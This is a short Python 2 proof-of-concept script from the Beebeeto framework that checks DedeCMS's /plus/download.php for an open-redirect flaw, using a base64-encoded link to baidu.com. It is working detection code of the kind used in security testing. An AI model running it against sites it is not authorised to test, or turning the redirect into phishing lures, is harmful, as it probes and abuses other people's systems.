#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0128',
            'name': 'Dedecms /plus/download.php URL Redirect POC',
            'author': 'user1018',
            'create_date': '2014-10-30',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'dedecms',
            'vul_version': ['*'],
            'type': 'Other',
            'tag': ['dedecms漏洞', '/plus/download.php', 'URL跳转漏洞', 'php'],
            'desc': 'N/A',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-03638',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        # Base64 encode www.baidu.com(aHR0cDovL3d3dy5iYWlkdS5jb20)
        verify_url = args['options']['target'] + "/plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20"
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = requests.get(verify_url, allow_redirects=False)
        if dict(request.headers).get('location') == 'http://www.baidu.com':
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())